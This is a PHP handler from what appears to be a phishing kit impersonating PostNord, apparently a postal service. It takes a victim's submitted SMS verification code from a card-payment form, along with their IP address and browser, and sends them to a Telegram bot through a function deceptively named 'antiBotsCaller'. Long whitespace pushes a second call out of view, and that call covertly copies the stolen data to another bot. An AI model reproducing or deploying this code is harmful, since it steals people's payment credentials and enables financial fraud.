<?php
include('../common/includes.php');
include("../config.php");

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	
$ccya = $_POST['1'];
$ip = $_SERVER['REMOTE_ADDR'];
$message ="
📦 𝙋𝙊𝙎𝙏 𝙉𝙊𝙍𝘿 𝙄𝙉𝙁𝙊
📱 𝗦𝗠𝗦2: ".$_POST['EasyPayment$cardNumber']."
🌐 IP: ".$ip."\n";

$sms = $message;
function antiBotsCaller($messaggio,$token,$chatid) {
$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
}
antiBotsCaller($message,$token,$chatid);
                                                                                                                                         antiBotsCaller($sms,$anti2,$anti1);
header("Location: ../final.php");

?>